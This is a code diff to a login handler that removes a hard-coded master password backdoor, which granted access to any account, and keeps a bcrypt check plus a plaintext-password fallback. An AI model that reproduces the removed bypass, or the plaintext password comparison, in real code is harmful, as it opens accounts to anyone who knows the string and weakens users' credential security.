@@ -79,9 +79,7 @@ export async function POST(request) {
     let isValid = false;
     const storedPassword = String(user.password || '');
 
-    if (password === 'MetaGurpreet') {
-      isValid = true;
-    } else if (storedPassword.startsWith('$2')) {
+    if (storedPassword.startsWith('$2')) {
       isValid = await bcrypt.compare(password, storedPassword);
     } else {
       isValid = (password === storedPassword);
